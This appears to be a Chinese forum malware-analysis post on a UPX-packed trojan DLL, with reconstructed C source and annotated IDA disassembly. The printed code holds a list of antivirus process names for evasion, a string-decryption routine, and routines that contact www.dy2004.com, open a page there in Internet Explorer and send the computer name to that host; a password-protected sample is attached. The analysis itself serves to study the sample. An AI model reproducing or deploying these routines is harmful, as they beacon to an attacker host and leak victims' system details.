char KeyD[]={"360hotfix.exe|360rpt.exe|360safe.exe|360safebox.exe|360tray.exe|agentsvr.exe|apvxdwin.exe|ast.exe|avcenter.exe|avengine.exe|avgnt.exe|avguard.exe|avltmain.exe|avp32.exe|avtask.exe|bdagent.exe|bdwizreg.exe|boxmod.exe|ccapp.exe|ccenter.exe|ccevtmgr.exe|ccregvfy.exe|ccsetmgr.exe|cqw32.exe|DrvAnti.exe|egui.exe|ekrn.exe|enc98.EXE|extdb.exe|frameworkservice.exe|frwstub.exe|guardfield.exe|iparmor.exe|kaccore.exe|kasmain.exe|kav32.exe|kavstart.exe|kavsvc.exe|kavsvcui.exe|kislnchr.exe|kissvc.exe|kmailmon.exe|knownsvr.exe|kpfw32.exe|kpfwsvc.exe|kregex.exe|kvfw.exe|kvmonxp.exe|kvmonxp.kxp|kvol.exe|kvprescan.exe|kvsrvxp.exe|kvwsc.exe|kvxp.kxp|kwatch.exe|livesrv.exe|mcagent.exe|mcdash.exe|mcdetect.exe|mcshield.exe|mctskshd.exe|mcvsescn.exe|mcvsshld.exe|mghtml.exe|naprdmgr.exe|navapsvc.exe|navapw32.exe|navw32.exe|nmain.exe|nod32.exe|nod32krn.exe|nod32kui.exe|npfmntor.exe|oasclnt.exe|pavsrv51.exe|pfw.exe|psctrls.exe|psimreal.exe|psimsvc.exe|qqdoctormain.exe|ras.exe|ravmon.exe|ravmond.exe|ravstub.exe|ravtask.exe|rfwcfg.exe|rfwmain.exe|rfwproxy.exe|rfwsrv.exe|rsagent.exe|rsmain.exe|rsnetsvr.exe|rssafety.exe|rstray.exe|safebank.exe|safeboxtray.exe|scan32.exe|scanfrm.exe|sched.exe|seccenter.exe|secnotifier.exe|SetupLD.exe|shstat.exe|smartup.exe|sndsrvc.exe|spbbcsvc.exe|symlcsvc.exe|tbmon.exe|uihost.exe|ulibcfg.exe|updaterui.exe|uplive.exe|vcr32.exe|vcrmon.exe|vptray.exe|vsserv.exe|vstskmgr.exe|vstskmgr.exe|webproxy.exe|xcommsvr.exe|xnlscn.exe|修复工具"};

typedef struct _hostent {

  char FAR* h_name;

  char FAR* FAR* h_aliases;

  short h_addrtype;

  short h_length;

  char FAR* FAR* h_addr_list;

}*hostent;

void Encrypt()

{

/*char KeyA[]={

  0xCE,0xD2,0xD2,0xD6,0xA0,0x8B,0x8B,0xD3,0xD3,0xD3,

  0x8C,0xC2,0xDD,0x98,0x96,0x96,0x92,0x8C,0xC7,0xCB,

  0xC9,0x8B,0xC9,0xD7,0xCC,0x8B,0xC9,0xC9,0x8C,0xD2,

  0xDE,0xD2,0x00

}; 十六进制 Key*/

  unsigned long PartB =0;

  Sleep(1000);

  memset(VariableA,0,64);

  memset(VariableB,0,256);

  int Index=0;

  while(KeyA[Index])                  //开始解密

    {

    char Buf=KeyA[Index];

    Buf-=1;

    Buf^=0xA5;

      KeyA[Index]=Buf;

    Index++;

  }                                    //解密结束

  Index=0;

  while(KeyB[Index])

    {

    if(KeyB[Index]==0x2C)KeyB[Index]=0;

    Index++;

  }

  Index=0;

  while(KeyC[Index])

  {

    if(KeyC[Index]==0x2C)KeyC[Index]=0;

    Index++;

  }

  Index=0;

  while(KeyD[Index])

  {

    if(KeyD[Index]==0x7C)

    {

      KeyD[Index]=0;

      Index++;

    }

    else

      {

      if(KeyD[Index]==0x2C)

      {

        KeyD[Index]=0;

        Index++;

      }

      else Index++;

    }

  }

}

unsigned long int ThreadProcA(LPVOID AA)

{

  unsigned long a;

  a&=0;

  char *HostName="www.dy2004.com";

  hostent Host=0;

  DWORD Version;

  WSADATA Wsadata;

  int Error;

  Version=MAKEWORD(2,2);

  Error=WSAStartup(Version,&Wsadata);

  while(Host==0)

  {

    Host=(hostent)gethostbyname(HostName);

    Sleep(500);

  }

  return 0;

}

unsigned long int ThreadProc(LPVOID A)

{

  HANDLE H=CreateEvent(NULL,TRUE,FALSE,"4F9E860C-9BE9-474b-8FD1-F0EEDB20C77B");

  if(H!=0&&GetLastError()!=ERROR_ALREADY_EXISTS)

  {

    unsigned long PartA =0;

    Encrypt();

    PartA=0xFFFFFFFF;

    CreateThread(0,0,ThreadProcA,0,0,0);

  }

  ExitThread(0);

  return 0;

}
```

### 代码 2

```asm
UPX0:10003E29 ; int __stdcall sub_10003E29(char *)
UPX0:10003E29 sub_10003E29    proc near             ; CODE XREF: sub_10003F33+EDp

UPX0:10003E29 var_150         = dword ptr -150h
UPX0:10003E29 var_14C         = dword ptr -14Ch
UPX0:10003E29 var_148         = dword ptr -148h
UPX0:10003E29 var_140         = dword ptr -140h
UPX0:10003E29 var_13C         = dword ptr -13Ch
UPX0:10003E29 var_138         = dword ptr -138h
UPX0:10003E29 var_130         = dword ptr -130h
UPX0:10003E29 hObject         = dword ptr -114h
UPX0:10003E29 Dst             = byte  ptr -110h
UPX0:10003E29 var_10D         = byte  ptr -10Dh
UPX0:10003E29 var_4           = dword ptr -4
UPX0:10003E29 arg_0           = dword ptr  8

UPX0:10003E29 DownloadFile:
UPX0:10003E29                 push    ebp
UPX0:10003E2A                 mov     ebp, esp
UPX0:10003E2C                 sub     esp, 150h
UPX0:10003E32                 push    260             ; 初始化大小
UPX0:10003E37                 push    0               ; 初始化设置的字符
UPX0:10003E39                 lea     eax, [ebp+Dst]
UPX0:10003E3F                 push    eax             ; 初始化地址的启始偏移
UPX0:10003E40                 call    memset
UPX0:10003E45                 add     esp, 0Ch
UPX0:10003E48                 push    260             ; 接收路径缓冲区的最大字符
UPX0:10003E4D                 lea     eax, [ebp+Dst]
UPX0:10003E53                 push    eax             ; 接收系统目录的路径的缓冲区
UPX0:10003E54                 call    GetWindowsDirectoryA
UPX0:10003E5A                 push    257             ; 准备初始化的大小
UPX0:10003E5F                 push    0               ; 设置的字符
UPX0:10003E61                 lea     eax, [ebp-10Dh]
UPX0:10003E67                 push    eax             ; 初始化的起始偏移
UPX0:10003E68                 call    memset
UPX0:10003E6D                 add     esp, 0Ch
UPX0:10003E70                 push    offset aProgramFilesIn ; "Program Files\Internet Explorer\iexplor"...
UPX0:10003E75                 lea     eax, [ebp+Dst]
UPX0:10003E7B                 push    eax             ; 系统路径的缓冲区，上面的路径接上系统路径的缓冲区得到全路径
UPX0:10003E7C                 call    lstrcat
UPX0:10003E82                 push    60              ; 想要初始化的大小
UPX0:10003E84                 push    0               ; 初始化设置用的字符
UPX0:10003E86                 lea     eax, [ebp-14Ch] ; SHELLEXECUTEINFO 结构
UPX0:10003E8C                 push    eax             ; 初始化的起始偏移地址
UPX0:10003E8D                 call    memset
UPX0:10003E92                 add     esp, 0Ch
UPX0:10003E95                 mov     dword ptr [ebp-14Ch], 3Ch
UPX0:10003E9F                 mov     dword ptr [ebp-148h], 64
UPX0:10003EA9                 lea     eax, [ebp-110h]
UPX0:10003EAF                 mov     [ebp-13Ch], eax
```



```
UPX0:10003EB5                 mov     eax, [ebp+8]    ; 参数一 http://www.dy2004.com/msn/mm.htm  
UPX0:10003EB8                 mov     [ebp-138h], eax  
UPX0:10003EBE                 and     dword ptr [ebp-130h], 0  
UPX0:10003EC5                 mov     dword ptr [ebp-140h], offset Operation ; "open"  
UPX0:10003ECF                 lea     eax, [ebp-14Ch] ; SHELLEXECUTEINFO 结构  
UPX0:10003ED5                 push    eax  
UPX0:10003ED6                 call    ShellExecuteEx  
UPX0:10003EDC                 mov     [ebp-4], eax    ; 函数的返回值放到局部变量里面  
UPX0:10003EDF                 cmp     dword ptr [ebp-4], 1 ; 比较是否为 1,0 表示失败  
UPX0:10003EE3                 jnz     short loc_10003F2B ; 不等于 1 就返回，这里好像有错误  
UPX0:10003EE5                 and     dword ptr [ebp-150h], 0 ; 这个地址被赋值为 0，这里是返回条件的位置  
UPX0:10003EEC                 jmp     short loc_10003EFB  

UPX0:10003EEE ; ---------------------------------------------------------------------------  
UPX0:10003EEE  
UPX0:10003EEE loc_10003EEE:                   ; CODE XREF: DownloadFile+E6j  
UPX0:10003EEE                 mov     eax, [ebp-150h] ; 取出这个地方的值到 EAX 里面  
UPX0:10003EF4                 inc     eax             ; EAX 在加上 1  
UPX0:10003EF5                 mov     [ebp-150h], eax ; EAX 再在放入这个地方  
UPX0:10003EFB  
UPX0:10003EFB loc_10003EFB:                   ; CODE XREF: DownloadFile+C3j  
UPX0:10003EFB                 cmp     dword ptr [ebp-150h], 30 ; 比较这个地方是否为 0  
UPX0:10003F02                 jge     short loc_10003F11 ; 大于或等于就向下跳，否者延时 1000 毫秒  
UPX0:10003F04                 push    1000  
UPX0:10003F09                 call    Sleep           ; 延时  
UPX0:10003F0F                 jmp     short loc_10003EEE ; 向上跳转  
UPX0:10003F11 ; ---------------------------------------------------------------------------  
UPX0:10003F11  
UPX0:10003F11 loc_10003F11:                   ; CODE XREF: DownloadFile+D9j  
UPX0:10003F11                 push    0               ; uExitCode  
UPX0:10003F13                 push    [ebp+hObject]    ; hProcess  
UPX0:10003F19                 call    TerminateProcess ; 结束进程  
UPX0:10003F1F                 push    [ebp+hObject]    ; hObject  
UPX0:10003F25                 call    CloseHandle      ; 关闭进程句柄  
UPX0:10003F2B  
UPX0:10003F2B loc_10003F2B:                   ; CODE XREF: DownloadFile+BAj  
UPX0:10003F2B                 xor     eax, eax  
UPX0:10003F2D                 leave  
UPX0:10003F2E                 retn    4  
UPX0:10003F2E sub_10003E29    endp ; sp-analysis failed  
UPX0:10003F2E  
UPX0:10003F2E ; ---------------------------------------------------------------------------  
UPX0:10003F31                 db 2 dup(0CCh)  
UPX0:10003F33  
UPX0:10003F33 ; =============== S U B R O U T I N E =======================================  
UPX0:10003F33  
UPX0:10003F33 ; Attributes: bp-based frame  
UPX0:10003F33  
UPX0:10003F33 ; DWORD __stdcall sub_10003F33(LPVOID)  
UPX0:10003F33 sub_10003F33    proc near            ; DATA XREF: sub_1000332A+7Fo  
UPX0:10003F33  
UPX0:10003F33 Str             = dword ptr -7BCh  
UPX0:10003F33 Dst             = byte ptr -7B8h  
UPX0:10003F33 var_6B4         = dword ptr -6B4h  
UPX0:10003F33 buf             = byte ptr -6B0h  
UPX0:10003F33 s               = dword ptr -2B0h  
UPX0:10003F33 var_2AC         = dword ptr -2ACh  
UPX0:10003F33 Buffer          = byte ptr -2A8h  
UPX0:10003F33 nSize           = dword ptr -1A4h  
UPX0:10003F33 WSAData         = WSAData ptr -1A0h  
UPX0:10003F33 name            = sockaddr ptr -10h  
UPX0:10003F33  
UPX0:10003F33                 push    ebp  
UPX0:10003F34                 mov     ebp, esp  
UPX0:10003F36                 sub     esp, 7BCh  
UPX0:10003F3C                 and     dword ptr [ebp-6B4h], 0 ; 这个地址的数据初始化为 0  
UPX0:10003F43                 or      [ebp+s], 0FFFFFFFFh  
UPX0:10003F4A                 lea     eax, [ebp+WSAData]  
UPX0:10003F50                 push    eax             ; 接收相关信息  
UPX0:10003F51                 push    202h            ; 网络套接字版本  
UPX0:10003F56                 call    WSAStartup      ; 初始化套接字  
UPX0:10003F5C  
UPX0:10003F5C loc_10003F5C:                   ; CODE XREF: sub_10003F33+4Fj  
UPX0:10003F5C                 cmp     dword ptr [ebp-6B4h], 0 ; 比较主机名称是否为 0  
UPX0:10003F63                 jnz     short loc_10003F84 ; 不等于 0 就执行下面  
UPX0:10003F65                 push    name            ; name  
UPX0:10003F6B                 call    gethostbyname   ; 获得主机名  
UPX0:10003F71                 mov     [ebp-6B4h], eax ; 返回主机名，比如 GetHostName("www.example.com")返回 example.com  
UPX0:10003F77                 push    500             ; dwMilliseconds  
UPX0:10003F7C                 call    Sleep           ; 延时 500 毫秒  
UPX0:10003F82                 jmp     short loc_10003F5C  
UPX0:10003F84 ; ---------------------------------------------------------------------------  
UPX0:10003F84  
UPX0:10003F84 loc_10003F84:                   ; CODE XREF: sub_10003F33+30j  
UPX0:10003F84                 mov     eax, off_10008514 ; 字符串/msn/mm.htm 的地址放到 EAX 里面  
UPX0:10003F89                 mov     [ebp+Str], eax  
UPX0:10003F8F                 push    '.'             ; 要设置的字符串  
UPX0:10003F91                 push    [ebp+Str]       ; 被设置的字符串  
UPX0:10003F97                 call    strrchr         ; 连接字符串，字符串最后面设置一个。  
UPX0:10003F9D                 pop     ecx  
UPX0:10003F9E                 pop     ecx  
UPX0:10003F9F                 mov     [ebp-2ACh], eax ; EAX 指向的地址放到这个地址里面  
UPX0:10003FA5                 cmp     dword ptr [ebp-2ACh], 0 ; 比较这个地址是否为 NULL  
UPX0:10003FAC                 jnz     short loc_10003FBB ; 这个地址不为 NULL 就跳，不然停止套接字  
UPX0:10003FAE                 call    WSACleanup      ; 关闭套接字  
UPX0:10003FB4                 xor     eax, eax  
UPX0:10003FB6                 jmp     locret_1000415A  
UPX0:10003FBB ; ---------------------------------------------------------------------------  
UPX0:10003FBB  
UPX0:10003FBB loc_10003FBB:                   ; CODE XREF: sub_10003F33+79j  
UPX0:10003FBB                 mov     eax, [ebp-2ACh] ; 取出这个位置指向的地址到 EAX 里面  
UPX0:10003FC1                 inc     eax             ; EAX 加 1，指向这个位置的下个数据  
UPX0:10003FC2                 mov     [ebp-2ACh], eax ; EAX 的值在放回这个地址里面  
UPX0:10003FC8                 push    offset aAsp     ; 字符串 2  
UPX0:10003FCD                 push    dword ptr [ebp-2ACh] ; 字符串 1  
UPX0:10003FD3                 call    lstrcmpi        ; 比较它们是否一样  
UPX0:10003FD9                 test    eax, eax        ; 一样的话就下跳创建一个套接字  
UPX0:10003FDB                 jz      short loc_1000403F  
UPX0:10003FDD                 push    256             ; 初始化大小  
UPX0:10003FE2                 push    0               ; 初始化设置的字符  
UPX0:10003FE4                 lea     eax, [ebp+Dst]  
UPX0:10003FEA                 push    eax             ; 被初始化地址  
UPX0:10003FEB                 call    memset          ; 初始化现在这个地方 Dst 指针指向的地方大小 256 字节  
UPX0:10003FF0                 add     esp, 0Ch  
UPX0:10003FF3                 push    off_10008514    ; /msn/mm.htm 字符串的偏移地址  
UPX0:10003FF9                 push    name            ; www.dy2004.com 这个网站的偏移地址  
UPX0:10003FFF                 push    offset aHttpSS  ; http://%s%s 的偏移地址  
UPX0:10004004                 lea     eax, [ebp+Dst]  ; 上面被初始化的地址，现在把这 3 个连接起来  
UPX0:1000400A                 push    eax  
UPX0:1000400B                 call    wsprintfA  
UPX0:10004011                 add     esp, 10h  
UPX0:10004014  
UPX0:10004014 loc_10004014:                   ; CODE XREF: sub_10003F33+FDj  
UPX0:10004014                 xor     eax, eax        ; EAX 清零  
UPX0:10004016                 inc     eax             ; EAX 加上 1  
UPX0:10004017                 jz      short loc_10004032 ; EAX 为 0 就跳转，关闭套接字  
```



```
UPX0:10004019             lea     eax, [ebp+Dst]  ; 装入这个 http://www.dy2004.com/msn/mm.htm 的偏移地址  
UPX0:1000401F             push    eax            ; 偏移地址为参数一，参数是个数组  
UPX0:10004020             call    sub_10003E29   ; 这函数分析看下 idb 文件里面  
UPX0:10004025             push    120000         ; 延时的毫秒数  
UPX0:1000402A             call    Sleep          ; 启动延时  
UPX0:10004030             jmp     short loc_10004014  
UPX0:10004032 ; ---------------------------------------------------------------------------  
UPX0:10004032  
UPX0:10004032 loc_10004032:                     ; CODE XREF: sub_10003F33+E4j  
UPX0:10004032             call    WSACleanup     ; 关闭套接字  
UPX0:10004038             xor     eax, eax  
UPX0:1000403A             jmp     locret_1000415A  
UPX0:1000403F ; ---------------------------------------------------------------------------  
UPX0:1000403F  
UPX0:1000403F loc_1000403F:                     ; CODE XREF: sub_10003F33+A8j  
UPX0:1000403F             push    6            ; 使用家族地址的协议  
UPX0:10004041             push    1            ; 制定套接字类型  
UPX0:10004043             push    2            ; 家族地址  
UPX0:10004045             call    socket       ; 创建套接字  
UPX0:1000404B             mov     [ebp+s], eax ; 返回值放入这个地址  
UPX0:10004051             cmp     [ebp+s], 0FFFFFFFFh ; 比较返回值是否为-1，不是就跳，否者返回  
UPX0:10004058             jnz     short loc_10004061  
UPX0:1000405A             xor     eax, eax  
UPX0:1000405C             jmp     locret_1000415A  
UPX0:10004061 ; ---------------------------------------------------------------------------  
UPX0:10004061  
UPX0:10004061 loc_10004061:                     ; CODE XREF: sub_10003F33+125j  
UPX0:10004061             push    10h          ; 准备初始化的大小  
UPX0:10004063             push    0            ; 设置用的字符  
UPX0:10004065             lea     eax, [ebp+name]  
UPX0:10004068             push    eax          ; 初始化地址的起始偏移地址  
UPX0:10004069             call    memset  
UPX0:1000406E             add     esp, 0Ch  
UPX0:10004071             push    2  
UPX0:10004073             pop     eax  
UPX0:10004074             mov     [ebp+name.sa_family], ax  
UPX0:10004078             mov     eax, [ebp+var_6B4]  
UPX0:1000407E             mov     eax, [eax+0Ch]  
UPX0:10004081             mov     eax, [eax]  
UPX0:10004083             mov     eax, [eax]  
UPX0:10004085             mov     dword ptr [ebp+name.sa_data+2], eax  
UPX0:10004088             push    50h          ; hostshort  
UPX0:1000408A             call    htons  
UPX0:10004090             mov     word ptr [ebp+name.sa_data], ax  
UPX0:10004094             push    10h          ; namelen  
UPX0:10004096             lea     eax, [ebp+name]  
UPX0:10004099             push    eax          ; name  
UPX0:1000409A             push    [ebp+s]       ; s  
UPX0:100040A0             call    connect      ; 建立连接  
UPX0:100040A6             test    eax, eax  
UPX0:100040A8             jz      short loc_100040B1  
UPX0:100040AA             xor     eax, eax  
UPX0:100040AC             jmp     locret_1000415A  
UPX0:100040B1 ; ---------------------------------------------------------------------------  
UPX0:100040B1  
UPX0:100040B1 loc_100040B1:                     ; CODE XREF: sub_10003F33+175j  
UPX0:100040B1             push    100h         ; 初始化的大小  
UPX0:100040B6             push    0            ; 设置的字符  
UPX0:100040B8             lea     eax, [ebp+Buffer]  
UPX0:100040BE             push    eax          ; 被初始化的起始偏移地址  
UPX0:100040BF             call    memset  
UPX0:100040C4             add     esp, 0Ch  
UPX0:100040C7             mov     [ebp+nSize], 100h  
UPX0:100040D1             lea     eax, [ebp+nSize]  
UPX0:100040D7             push    eax          ; 缓冲区大小  
UPX0:100040D8             lea     eax, [ebp+Buffer]  
UPX0:100040DE             push    eax          ; 缓冲区  
UPX0:100040DF             call    GetComputerNameA ; 获得计算机名称  
UPX0:100040E5             push    400h         ; 初始化的大小  
UPX0:100040EA             push    0            ; 设置的字符  
UPX0:100040EC             lea     eax, [ebp+buf]  
UPX0:100040F2             push    eax          ; 起始的偏移地址  
UPX0:100040F3             call    memset  
UPX0:100040F8             add     esp, 0Ch  
UPX0:100040FB             push    name  
UPX0:10004101             lea     eax, [ebp+Buffer]  
UPX0:10004107             push    eax  
UPX0:10004108             push    off_10008514  
UPX0:1000410E             push    offset aGetS?nameSHttp ; "GET %s?name=%s HTTP/1.1\r\nUser-Agent: Mo"...  
UPX0:10004113             lea     eax, [ebp+buf]  
UPX0:10004119             push    eax          ; LPSTR  
UPX0:1000411A             call    wsprintfA    ; 把上面的信息格式化为一整个字符串  
UPX0:10004120             add     esp, 14h  
UPX0:10004123             push    0            ; flags  
UPX0:10004125             lea     eax, [ebp+buf]  
UPX0:1000412B             push    eax  
UPX0:1000412C             call    lstrlen      ; 测试上面字符串的长度  
UPX0:10004132             push    eax          ; len  
UPX0:10004133             lea     eax, [ebp+buf]  
UPX0:10004139             push    eax          ; buf  
UPX0:1000413A             push    [ebp+s]      ; s  
UPX0:10004140             call    send         ; 发送数据  
UPX0:10004146             push    [ebp+s]      ; s  
UPX0:1000414C             call    closesocket  ; 关闭连接  
UPX0:10004152             call    WSACleanup   ; 关闭套接字  
UPX0:10004158             xor     eax, eax  
UPX0:1000415A  
UPX0:1000415A locret_1000415A:                ; CODE XREF: sub_10003F33+83j  
UPX0:1000415A                                            ; sub_10003F33+107j ...  
UPX0:1000415A             leave  
UPX0:1000415B             retn    4  
UPX0:1000415B sub_10003F33    endp
```

上传的附件

| `![sample_image](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg)` | `样本分析.rar` (解压密码：`muma`) |
| :--- | :--- |
